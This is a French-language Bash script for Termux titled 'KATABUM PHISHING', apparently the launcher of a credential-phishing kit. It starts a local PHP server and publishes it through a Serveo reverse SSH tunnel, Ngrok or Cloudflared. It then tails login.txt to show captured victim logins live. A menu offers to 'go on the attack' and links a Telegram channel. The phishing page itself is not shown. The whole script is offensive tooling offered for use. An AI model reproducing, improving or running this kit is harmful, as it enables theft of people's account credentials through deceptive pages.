#!/bin/bash

BLEU='\033[1;34m'
JAUNE='\033[1;33m'
ROUGE='\033[1;31m'
NC='\033[0m' # Pas de couleur

# Fonction pour démarrer le serveur PHP
demarrer_serveur_php() {
    echo -e "${BLEU}[•] Démarrage du serveur PHP...${NC}"
    php -S localhost:3000 > /dev/null 2>&1 &
    sleep 2
}

# Fonction pour télécharger et installer Ngrok
installer_ngrok() {
    echo -e "${JAUNE}[•] Téléchargement de Ngrok pour ARM64...${NC}"
    ngrok_url="https://github.com/inconshreveable/ngrok/releases/download/2.2.8/ngrok-arm64.zip"
    if wget -O ngrok.zip "$ngrok_url"; then
        echo -e "${BLEU}[✓] Ngrok téléchargé avec succès.${NC}"
    else
        echo -e "${ROUGE}[!] Échec du téléchargement de Ngrok.${NC}"
        exit 1
    fi
    if unzip ngrok.zip; then
        mkdir -p ~/bin/
        mv ngrok ~/bin/ || {
            echo -e "${ROUGE}[!] Impossible de déplacer Ngrok vers ~/bin/.${NC}"
            exit 1
        }
        rm ngrok.zip
        echo -e "${BLEU}[✓] Ngrok installé avec succès.${NC}"
        export PATH=$PATH:~/bin/
    else
        echo -e "${ROUGE}[!] Échec de l'extraction de Ngrok.${NC}"
        rm ngrok.zip
        exit 1
    fi
}

# Fonction pour générer un lien avec Ngrok
generer_lien_ngrok() {
    echo -e "${JAUNE}[•] Démarrage de Ngrok...${NC}"
    if ! command -v ngrok &> /dev/null; then
        installer_ngrok
    fi
    ~/bin/ngrok http 3000 || {
        echo -e "${ROUGE}[!] Erreur au lancement de Ngrok.${NC}"
        exit 1
    }
}

# Fonction pour générer un lien avec Serveo
generer_lien_serveo() {
    echo -e "${JAUNE}HEXTECH 🦠 [*] Connexion à Serveo...${NC}"
    ssh -R 80:localhost:3000 serveo.net -p 22 || {
        echo -e "${ROUGE}[!] Échec de la connexion à Serveo.${NC}"
    }
}

# Fonction pour générer un lien avec Cloudflared
generer_lien_autre() {
    echo -e "${JAUNE}[•] Démarrage avec Cloudflared...${NC}"
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${ROUGE}[!] Installation de Cloudflared...${NC}"
        pkg install cloudflared -y
    fi
    cloudflared tunnel --url http://localhost:3000 || {
        echo -e "${ROUGE}[!] Erreur au lancement de Cloudflared.${NC}"
        exit 1
    }
}

# Fonction pour surveiller login.txt et afficher en live
surveiller_login() {
    echo -e "${JAUNE}[•] En attente des utilisateurs...${NC}"
    echo ""
    if [ -f login.txt ]; then
        tail -f login.txt | while read ligne
        do
            echo -e "${BLEU}[+] Nouvelle connexion détectée : $ligne${NC}"
        done
    else
        echo -e "${ROUGE}[!] Le fichier login.txt est introuvable.${NC}"
    fi
}

# Vérification des dépendances
if ! command -v ssh &> /dev/null; then
    echo -e "${ROUGE}[!] SSH n'est pas installé. Installation...${NC}"
    pkg install openssh -y
fi
if ! command -v php &> /dev/null; then
    echo -e "${ROUGE}[!] PHP n'est pas installé. Installation...${NC}"
    pkg install php -y
fi

# Menu principal
clear
echo -e "\033[1;36m"
echo "=========================================="
echo "   ██╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗"
echo "   ██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║"
echo "   ███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║"
echo "   ██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║"
echo "   ██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║"
echo "   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝"
echo "=========================================="
echo -e "\033[0m"
echo "=========================================="
echo "          KATABUM PHISHING"
echo "=========================================="
echo -e "${JAUNE}1. passer à l'attaque${NC}"
echo -e "${JAUNE}2. Rejoindre notre canal Telegram${NC}"

read -p "Choisissez une option (1 ou 2) : " choix

if [ "$choix" == "1" ]; then
    echo -e "${JAUNE}Choisissez une méthode pour générer un lien public :${NC}"
    echo -e "${BLEU}1. Serveo${NC}"
    echo -e "${BLEU}2. Ngrok${NC}"
    echo -e "${BLEU}3. Cloudflared${NC}"
    read -p "Votre choix (1, 2 ou 3) : " methode

    demarrer_serveur_php

    case "$methode" in
        1) generer_lien_serveo ;;
        2) generer_lien_ngrok ;;
        3) generer_lien_autre ;;
        *) echo -e "${ROUGE}Option invalide.${NC}" ;;
    esac

    # Lancer la surveillance après génération du lien
    surveiller_login

elif [ "$choix" == "2" ]; then
    echo -e "${BLEU}Ouverture du canal Telegram...${NC}"
    termux-open-url "https://t.me/hextechcar"
else
    echo -e "${ROUGE}Option invalide. Quitter...${NC}"
fi
